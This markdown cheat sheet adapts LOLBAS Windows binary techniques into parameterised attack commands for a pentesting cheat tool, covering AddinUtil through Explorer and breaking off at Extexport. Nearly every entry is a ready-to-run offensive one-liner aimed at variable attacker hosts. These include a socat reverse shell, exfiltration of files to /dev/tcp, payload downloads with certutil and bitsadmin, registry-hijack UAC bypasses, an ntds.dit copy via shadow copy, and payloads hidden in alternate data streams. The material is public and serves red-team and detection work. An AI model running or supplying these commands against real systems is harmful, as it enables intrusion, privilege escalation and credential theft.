# Lolbas

Reference for [LOLBAS](https://lolbas-project.github.io/) techniques. Each binary lists its known commands parameterized for the cheat system. Variables (`$cmd`, `$file_out`, `$file`, `$dir`, `$share`) prompt at runtime; `$lhost` and `$lport` come from `common.md` (`tun_ip`, `lports`).

# OS Binaries

## AddinUtil.exe

.NET Tool used for updating cache files for Microsoft Office Add-Ins.

**Path(s):**
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\AddinUtil.exe`
- `C:\Windows\Microsoft.NET\Framework\v3.5\AddInUtil.exe`
- `C:\Windows\Microsoft.NET\Framework64\v3.5\AddInUtil.exe`

### AddinUtil.exe Execute

AddinUtil is executed from the directory where the 'Addins.Store' payload exists, AddinUtil will execute the 'Addins.Store' payload.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas AddinUtil.exe Execute"
C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.
```
<!-- cheat
-->

## AppInstaller.exe

Tool used for installation of AppX/MSIX applications on Windows 10

**Path(s):**
- `C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe`

### AppInstaller.exe Download

AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas AppInstaller.exe Download"
start ms-appinstaller://?source=$scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Aspnet_Compiler.exe

ASP.NET Compilation Tool

**Path(s):**
- `c:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe`
- `c:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe`

### Aspnet_Compiler.exe AWL Bypass

Execute C# code with the Build Provider and proper folder structure in place.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Execute C# code with the Build Provider and proper folder structure in place"
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u
```
<!-- cheat
-->

## At.exe

Schedule periodic tasks

**Path(s):**
- `C:\WINDOWS\System32\At.exe`
- `C:\WINDOWS\SysWOW64\At.exe`

### At.exe Execute

Create a recurring task to execute every day at a specific time.

*Privileges: Local Admin • MITRE: T1053.002*

```cmd title:"Lolbas Create a recurring task to execute every day at a specific time"
C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su $cmd
```
<!-- cheat
var cmd
-->

## Atbroker.exe

Helper binary for Assistive Technology (AT)

**Path(s):**
- `C:\Windows\System32\Atbroker.exe`
- `C:\Windows\SysWOW64\Atbroker.exe`

### Atbroker.exe Execute

Start a registered Assistive Technology (AT).

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Start a registered Assistive Technology (AT)"
ATBroker.exe /start malware
```
<!-- cheat
-->

## Bash.exe

File used by Windows subsystem for Linux

**Path(s):**
- `C:\Windows\System32\bash.exe`
- `C:\Windows\SysWOW64\bash.exe`

### Bash.exe Execute #1

Executes executable from bash.exe

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Executes executable from bash.exe"
bash.exe -c "$cmd"
```
<!-- cheat
var cmd
-->

### Bash.exe Execute #2

Executes a reverse shell

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Executes a reverse shell"
bash.exe -c "socat tcp-connect:$lhost:$lport exec:sh,pty,stderr,setsid,sigint,sane"
```
<!-- cheat
import tun_ip
import lports
-->

### Bash.exe Execute #3

Exfiltrate data

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Exfiltrate data"
bash.exe -c 'cat $file_out > /dev/tcp/$lhost/24'
```
<!-- cheat
import tun_ip
var file_out
-->

### Bash.exe AWL Bypass #4

Executes executable from bash.exe

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Executes executable from bash.exe"
bash.exe -c "$cmd"
```
<!-- cheat
var cmd
-->

### Bash.exe Execute #5

When executed, `bash.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`, which contains a folder path (`c:\program files\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Bash.exe Execute #5"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation" /ve /d "$file_in" /f
bash.exe
```
<!-- cheat
var file_in
-->

## Bitsadmin.exe

Used for managing background intelligent transfer

**Path(s):**
- `C:\Windows\System32\bitsadmin.exe`
- `C:\Windows\SysWOW64\bitsadmin.exe`

### Bitsadmin.exe ADS #1

Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Bitsadmin.exe ADS #1"
bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe $file_in bitsadmin /SetNotifyCmdLine 1 $file_in NULL bitsadmin /RESUME 1 bitsadmin /complete 1
```
<!-- cheat
var file_in
-->

### Bitsadmin.exe Download #2

Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Bitsadmin.exe Download #2"
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe $file_in bitsadmin /RESUME 1 bitsadmin /complete 1
```
<!-- cheat
var file_in
-->

### Bitsadmin.exe Copy #3

Command for copying cmd.exe to another folder

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Command for copying cmd.exe to another folder"
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe $file_in & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
```
<!-- cheat
var file_in
-->

### Bitsadmin.exe Execute #4

One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Bitsadmin.exe Execute #4"
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe $file_in & bitsadmin /SetNotifyCmdLine 1 $file_in NULL & bitsadmin /RESUME 1 & bitsadmin /Reset
```
<!-- cheat
var file_in
-->

## CertOC.exe

Used for installing certificates

**Path(s):**
- `c:\windows\system32\certoc.exe`
- `c:\windows\syswow64\certoc.exe`

### CertOC.exe Execute #1

Loads the target DLL file

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Loads the target DLL file"
certoc.exe -LoadDLL $file_out
```
<!-- cheat
var file_out
-->

### CertOC.exe Download #2

Downloads text formatted files

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads text formatted files"
certoc.exe -GetCACAPS $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## CertReq.exe

Used for requesting and managing certificates

**Path(s):**
- `C:\Windows\System32\certreq.exe`
- `C:\Windows\SysWOW64\certreq.exe`

### CertReq.exe Download #1

Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument).

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas CertReq.exe Download #1"
CertReq -Post -config $scheme://$lhost:$lport/$file $file_out $file_out
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

### CertReq.exe Upload #2

Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas CertReq.exe Upload #2"
CertReq -Post -config $scheme://$lhost:$lport/$file $file_out
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

## Certutil.exe

Windows binary used for handling certificates

**Path(s):**
- `C:\Windows\System32\certutil.exe`
- `C:\Windows\SysWOW64\certutil.exe`

### Certutil.exe Download #1

Download and save an executable to disk in the current folder.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Download and save an executable to disk in the current folder"
certutil.exe -urlcache -f $scheme://$lhost:$lport/$file $file_out
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

### Certutil.exe Download #2

Download and save an executable to disk in the current folder when a file path is specified, or `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>` when not.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Certutil.exe Download #2"
certutil.exe -verifyctl -f $scheme://$lhost:$lport/$file $file_out
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

### Certutil.exe ADS #3

Download and save a .ps1 file to an Alternate Data Stream (ADS).

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Download and save a .ps1 file to an Alternate Data Stream (ADS)"
certutil.exe -urlcache -f $scheme://$lhost:$lport/$file $file_out:ttt
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

### Certutil.exe Download #4

Download and save an executable to `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>`.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Download and save an executable to %LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>"
certutil.exe -URL $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Certutil.exe Encode #5

Command to encode a file using Base64

*Privileges: User • MITRE: T1027.013*

```cmd title:"Lolbas Command to encode a file using Base64"
certutil -encode $file_out $file_out
```
<!-- cheat
var file_out
-->

### Certutil.exe Decode #6

Command to decode a Base64 encoded file.

*Privileges: User • MITRE: T1140*

```cmd title:"Lolbas Command to decode a Base64 encoded file"
certutil -decode $file_out $file_out
```
<!-- cheat
var file_out
-->

### Certutil.exe Decode #7

Command to decode a hexadecimal-encoded file.

*Privileges: User • MITRE: T1140*

```cmd title:"Lolbas Command to decode a hexadecimal-encoded file"
certutil -decodehex $file_out $file_out
```
<!-- cheat
var file_out
-->

## Change.exe

Remote Desktop Services MultiUser Change Utility

**Path(s):**
- `c:\windows\system32\change.exe`
- `c:\windows\syswow64\change.exe`

### Change.exe Execute

Once executed, `change.exe` will execute `chgusr.exe` in the same folder. Thus, if `change.exe` is copied to a folder and an arbitrary executable is renamed to `chgusr.exe`, `change.exe` will spawn it. Instead of `user`, it is also possible to use `port` or `logon` as command-line option.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Once executed, change.exe will execute chgusr.exe in the same folder"
change.exe user
```
<!-- cheat
-->

## Cipher.exe

File Encryption Utility

**Path(s):**
- `c:\windows\system32\cipher.exe`
- `c:\windows\syswow64\cipher.exe`

### Cipher.exe Tamper #1

Zero out a file

*Privileges: User • MITRE: T1485*

```cmd title:"Lolbas Zero out a file"
cipher /w:$dir
```
<!-- cheat
var dir
-->

### Cipher.exe Tamper #2

Encrypt a file

*Privileges: Admin • MITRE: T1562*

```cmd title:"Lolbas Encrypt a file"
cipher.exe /e $file_out
```
<!-- cheat
var file_out
-->

## Cmd.exe

The command-line interpreter in Windows

**Path(s):**
- `C:\Windows\System32\cmd.exe`
- `C:\Windows\SysWOW64\cmd.exe`

### Cmd.exe ADS #1

Add content to an Alternate Data Stream (ADS).

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Add content to an Alternate Data Stream (ADS)"
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:$scheme://$lhost:$lport/$file ^scrobj.dll > $file_out:payload.bat
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

### Cmd.exe ADS #2

Execute payload.bat stored in an Alternate Data Stream (ADS).

*Privileges: User • MITRE: T1059.003*

```cmd title:"Lolbas Execute payload.bat stored in an Alternate Data Stream (ADS)"
cmd.exe - < $file_out:payload.bat
```
<!-- cheat
var file_out
-->

### Cmd.exe Download #3

Downloads a specified file from a WebDAV server to the target file.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads a specified file from a WebDAV server to the target file"
type \\$lhost\$share\$file > $file_out
```
<!-- cheat
import tun_ip
var file
var file_out
var share
-->

### Cmd.exe Upload #4

Uploads a specified file to a WebDAV server.

*Privileges: User • MITRE: T1048.003*

```cmd title:"Lolbas Uploads a specified file to a WebDAV server"
type $file_out > \\$lhost\$share\$file
```
<!-- cheat
import tun_ip
var file
var file_out
var share
-->

## Cmdkey.exe

creates, lists, and deletes stored user names and passwords or credentials.

**Path(s):**
- `C:\Windows\System32\cmdkey.exe`
- `C:\Windows\SysWOW64\cmdkey.exe`

### Cmdkey.exe Credentials

List cached credentials

*Privileges: User • MITRE: T1078*

```cmd title:"Lolbas List cached credentials"
cmdkey /list
```
<!-- cheat
-->

## cmdl32.exe

Microsoft Connection Manager Auto-Download

**Path(s):**
- `C:\Windows\System32\cmdl32.exe`
- `C:\Windows\SysWOW64\cmdl32.exe`

### cmdl32.exe Download

Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where "X" denotes a random number or letter.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Download a file from the web address specified in the configuration file"
cmdl32 /vpn /lan %cd%\config
```
<!-- cheat
-->

## Cmstp.exe

Installs or removes a Connection Manager service profile.

**Path(s):**
- `C:\Windows\System32\cmstp.exe`
- `C:\Windows\SysWOW64\cmstp.exe`

### Cmstp.exe Execute #1

Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.

*Privileges: User • MITRE: T1218.003*

```cmd title:"Lolbas Silently installs a specially formatted local .INF without creating a desktop icon"
cmstp.exe /ni /s $file_out
```
<!-- cheat
var file_out
-->

### Cmstp.exe AWL Bypass #2

Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.

*Privileges: User • MITRE: T1218.003*

```cmd title:"Lolbas Silently installs a specially formatted remote .INF without creating a desktop icon"
cmstp.exe /ni /s $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Cmstp.exe Execute #3

cmstp.exe reads the `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe\CmstpExtensionDll` registry value and passes its data directly to `LoadLibrary`. By modifying this registry key and setting it to an attack-controlled DLL, this will sideload the DLL via `cmstp.exe`.

*Privileges: Administrator • MITRE: T1218.003*

```cmd title:"Lolbas Cmstp.exe Execute #3"
cmstp.exe /nf
```
<!-- cheat
-->

## Colorcpl.exe

Binary that handles color management

**Path(s):**
- `C:\Windows\System32\colorcpl.exe`
- `C:\Windows\SysWOW64\colorcpl.exe`

### Colorcpl.exe Copy

Copies the referenced file to C:\Windows\System32\spool\drivers\color\.

*Privileges: User • MITRE: T1036.005*

```cmd title:"Lolbas Copies the referenced file to C:\Windows\System32\spool\drivers\color\"
colorcpl $file_out
```
<!-- cheat
var file_out
-->

## ComputerDefaults.exe

ComputerDefaults.exe is a Windows system utility for managing default applications for tasks like web browsing, emailing, and media playback.

**Path(s):**
- `C:\Windows\System32\ComputerDefaults.exe`
- `C:\Windows\SysWOW64\ComputerDefaults.exe`

### ComputerDefaults.exe UAC Bypass

Upon execution, ComputerDefaults.exe checks two registry values at HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\open\command; if these are set by an attacker, the set command will be executed as a high-integrity process without a UAC prompt being displayed to the user. See 'resources' for which registry keys/values to set.

*Privileges: User • MITRE: T1548.002*

```cmd title:"Lolbas ComputerDefaults.exe UAC Bypass"
ComputerDefaults.exe
```
<!-- cheat
-->

## ConfigSecurityPolicy.exe

Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.

**Path(s):**
- `C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe`
- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe`

### ConfigSecurityPolicy.exe Upload #1

Upload file, credentials or data exfiltration in general

*Privileges: User • MITRE: T1567*

```cmd title:"Lolbas Upload file, credentials or data exfiltration in general"
ConfigSecurityPolicy.exe $file_out $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

### ConfigSecurityPolicy.exe Download #2

It will download a remote payload and place it in INetCache.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas It will download a remote payload and place it in INetCache"
ConfigSecurityPolicy.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Conhost.exe

Console Window host

**Path(s):**
- `c:\windows\system32\conhost.exe`

### Conhost.exe Execute #1

Execute a command line with conhost.exe as parent process

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Execute a command line with conhost.exe as parent process"
conhost.exe $cmd
```
<!-- cheat
var cmd
-->

### Conhost.exe Execute #2

Execute a command line with conhost.exe as parent process

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Execute a command line with conhost.exe as parent process"
conhost.exe --headless $cmd
```
<!-- cheat
var cmd
-->

## Control.exe

Binary used to launch controlpanel items in Windows

**Path(s):**
- `C:\Windows\System32\control.exe`
- `C:\Windows\SysWOW64\control.exe`

### Control.exe ADS #1

Execute evil.dll which is stored in an Alternate Data Stream (ADS).

*Privileges: User • MITRE: T1218.002*

```cmd title:"Lolbas Execute evil.dll which is stored in an Alternate Data Stream (ADS)"
control.exe $file_out:evil.dll
```
<!-- cheat
var file_out
-->

### Control.exe Execute #2

Execute .cpl file. A CPL is a DLL file with CPlApplet export function.

*Privileges: User • MITRE: T1218.002*

```cmd title:"Lolbas Execute .cpl file. A CPL is a DLL file with CPlApplet export function."
control.exe $file_out
```
<!-- cheat
var file_out
-->

## Csc.exe

Binary file used by .NET Framework to compile C# code

**Path(s):**
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe`
- `C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe`
- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe`

### Csc.exe Compile #1

Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to the specified .exe path.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Csc.exe Compile #1"
csc.exe -out:$file_out $file_out
```
<!-- cheat
var file_out
-->

### Csc.exe Compile #2

Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to a DLL file with the same name.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Csc.exe Compile #2"
csc -target:library $file_out
```
<!-- cheat
var file_out
-->

## Cscript.exe

Binary used to execute scripts in Windows

**Path(s):**
- `C:\Windows\System32\cscript.exe`
- `C:\Windows\SysWOW64\cscript.exe`

### Cscript.exe ADS

Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS).

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS)"
cscript //e:vbscript $file_out:script.vbs
```
<!-- cheat
var file_out
-->

## CustomShellHost.exe

A host process that is used by custom shells when using Windows in Kiosk mode.

**Path(s):**
- `C:\Windows\System32\CustomShellHost.exe`

### CustomShellHost.exe Execute

Executes explorer.exe (with command-line argument /NoShellRegistrationCheck) if present in the current working folder.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas CustomShellHost.exe Execute"
CustomShellHost.exe
```
<!-- cheat
-->

## DataSvcUtil.exe

DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.

**Path(s):**
- `C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe`

### DataSvcUtil.exe Upload

Upload file, credentials or data exfiltration in general

*Privileges: User • MITRE: T1567*

```cmd title:"Lolbas Upload file, credentials or data exfiltration in general"
DataSvcUtil /out:$file_out /uri:$scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

## Desktopimgdownldr.exe

Windows binary used to configure lockscreen/desktop image

**Path(s):**
- `c:\windows\system32\desktopimgdownldr.exe`

### Desktopimgdownldr.exe Download

Downloads the file and sets it as the computer's lockscreen

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads the file and sets it as the computer's lockscreen"
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:$scheme://$lhost:$lport/$file /eventName:desktopimgdownldr
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## DeviceCredentialDeployment.exe

Device Credential Deployment

**Path(s):**
- `C:\Windows\System32\DeviceCredentialDeployment.exe`

### DeviceCredentialDeployment.exe Conceal

Grab the console window handle and set it to hidden

*Privileges: User • MITRE: T1564*

```cmd title:"Lolbas Grab the console window handle and set it to hidden"
DeviceCredentialDeployment
```
<!-- cheat
-->

## Dfsvc.exe

ClickOnce engine in Windows used by .NET

**Path(s):**
- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe`

### Dfsvc.exe AWL Bypass

Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)

*Privileges: User • MITRE: T1127.002*

```cmd title:"Lolbas Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)"
rundll32.exe dfshim.dll,ShOpenVerbApplication $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Diantz.exe

Binary that package existing files into a cabinet (.cab) file

**Path(s):**
- `c:\windows\system32\diantz.exe`
- `c:\windows\syswow64\diantz.exe`

### Diantz.exe ADS #1

Compress a file (first argument) into a CAB file stored in the Alternate Data Stream (ADS) of the target file.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Diantz.exe ADS #1"
diantz.exe $file_out $file_out:targetFile.cab
```
<!-- cheat
var file_out
-->

### Diantz.exe Download #2

Download and compress a remote file and store it in a CAB file on local machine.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Download and compress a remote file and store it in a CAB file on local machine"
diantz.exe \\$lhost\$share\$file $file_out
```
<!-- cheat
import tun_ip
var file
var file_out
var share
-->

### Diantz.exe Execute #3

Execute diantz directives as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.

*Privileges: User • MITRE: T1036*

```cmd title:"Lolbas Diantz.exe Execute #3"
diantz /f $file_out
```
<!-- cheat
var file_out
-->

## Diskshadow.exe

Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).

**Path(s):**
- `C:\Windows\System32\diskshadow.exe`
- `C:\Windows\SysWOW64\diskshadow.exe`

### Diskshadow.exe Dump #1

Execute commands using diskshadow.exe from a prepared diskshadow script.

*Privileges: User • MITRE: T1003.003*

```cmd title:"Lolbas Execute commands using diskshadow.exe from a prepared diskshadow script"
diskshadow.exe /s $file_out
```
<!-- cheat
var file_out
-->

### Diskshadow.exe Execute #2

Execute commands using diskshadow.exe to spawn child process

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Execute commands using diskshadow.exe to spawn child process"
diskshadow> exec $file_out
```
<!-- cheat
var file_out
-->

## Dnscmd.exe

A command-line interface for managing DNS servers

**Path(s):**
- `C:\Windows\System32\Dnscmd.exe`
- `C:\Windows\SysWOW64\Dnscmd.exe`

### Dnscmd.exe Execute

Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.

*Privileges: DNS admin • MITRE: T1543.003*

```cmd title:"Lolbas Adds a specially crafted DLL as a plug-in of the DNS Service"
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\$lhost\$share\$file
```
<!-- cheat
import tun_ip
var file
var share
-->

## Esentutl.exe

Binary for working with Microsoft Joint Engine Technology (JET) database

**Path(s):**
- `C:\Windows\System32\esentutl.exe`
- `C:\Windows\SysWOW64\esentutl.exe`

### Esentutl.exe Copy #1

Copies the source VBS file to the destination VBS file.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Copies the source VBS file to the destination VBS file"
esentutl.exe /y $file_out /d $file_out /o
```
<!-- cheat
var file_out
-->

### Esentutl.exe ADS #2

Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Copies the source EXE to an Alternate Data Stream (ADS) of the destination file"
esentutl.exe /y $file_out /d $file_out:file.exe /o
```
<!-- cheat
var file_out
-->

### Esentutl.exe ADS #3

Copies the source Alternate Data Stream (ADS) to the destination EXE.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Copies the source Alternate Data Stream (ADS) to the destination EXE"
esentutl.exe /y $file_out:file.exe /d $file_out /o
```
<!-- cheat
var file_out
-->

### Esentutl.exe ADS #4

Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file"
esentutl.exe /y \\$lhost\$share\$file /d $file_out:file.exe /o
```
<!-- cheat
import tun_ip
var file
var file_out
var share
-->

### Esentutl.exe Download #5

Copies the source EXE to the destination EXE file

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Copies the source EXE to the destination EXE file"
esentutl.exe /y \\$lhost\$share\$file /d \\$lhost\$share\$file /o
```
<!-- cheat
import tun_ip
var file
var share
-->

### Esentutl.exe Copy #6

Copies a (locked) file using Volume Shadow Copy

*Privileges: Admin • MITRE: T1003.003*

```cmd title:"Lolbas Copies a (locked) file using Volume Shadow Copy"
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d $file_out
```
<!-- cheat
var file_out
-->

## Eudcedit.exe

Private Character Editor Windows Utility

**Path(s):**
- `c:\windows\system32\eudcedit.exe`
- `c:\windows\syswow64\eudcedit.exe`

### Eudcedit.exe UAC Bypass

Once executed, the Private Charecter Editor will be opened - click OK, then click File -> Font Links. In the next window choose the option "Link with Selected Fonts" and click on Save As, then in the opened enter the command you want to execute.

*Privileges: Administrator • MITRE: T1548.002*

```cmd title:"Lolbas Eudcedit.exe UAC Bypass"
eudcedit
```
<!-- cheat
-->

## Eventvwr.exe

Displays Windows Event Logs in a GUI window.

**Path(s):**
- `C:\Windows\System32\eventvwr.exe`
- `C:\Windows\SysWOW64\eventvwr.exe`

### Eventvwr.exe UAC Bypass #1

During startup, eventvwr.exe checks the registry value `HKCU\Software\Classes\mscfile\shell\open\command` for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user.

*Privileges: User • MITRE: T1548.002*

```cmd title:"Lolbas Eventvwr.exe UAC Bypass #1"
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d "$file_in" /f
eventvwr.exe
```
<!-- cheat
var file_in
-->

### Eventvwr.exe UAC Bypass #2

During startup, eventvwr.exe uses .NET deserialization with `%LOCALAPPDATA%\Microsoft\EventV~1\RecentViews` file. This file can be created using https://github.com/pwntester/ysoserial.net

*Privileges: Administrator • MITRE: T1548.002*

```cmd title:"Lolbas Eventvwr.exe UAC Bypass #2"
ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c "$cmd" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe
```
<!-- cheat
var cmd
-->

## Expand.exe

Binary that expands one or more compressed files

**Path(s):**
- `C:\Windows\System32\Expand.exe`
- `C:\Windows\SysWOW64\Expand.exe`

### Expand.exe Download #1

Copies source file to destination.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Copies source file to destination"
expand \\$lhost\$share\$file $file_out
```
<!-- cheat
import tun_ip
var file
var file_out
var share
-->

### Expand.exe Copy #2

Copies source file to destination.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Copies source file to destination"
expand $file_out $file_out
```
<!-- cheat
var file_out
-->

### Expand.exe ADS #3

Copies source file to destination Alternate Data Stream (ADS)

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Copies source file to destination Alternate Data Stream (ADS)"
expand \\$lhost\$share\$file $file_out:file.bat
```
<!-- cheat
import tun_ip
var file
var file_out
var share
-->

## Explorer.exe

Binary used for managing files and system components within Windows

**Path(s):**
- `C:\Windows\explorer.exe`
- `C:\Windows\SysWOW64\explorer.exe`

### Explorer.exe Execute #1

Execute specified .exe with the parent process spawning from a new instance of explorer.exe

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Execute specified .exe with the parent process spawning from a new instance of explorer.exe"
explorer.exe /root,"$file_out"
```
<!-- cheat
var file_out
-->

### Explorer.exe Execute #2

Execute notepad.exe with the parent process spawning from a new instance of explorer.exe

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Execute notepad.exe with the parent process spawning from a new instance of explorer.exe"
explorer.exe $file_out
```
<!-- cheat
var file_out
-->

## Extexport.exe

Load a DLL located in the c:\test folder with a specific name.

**Path(s):**
- `C:\Program Files\Internet Explorer\Extexport.exe`
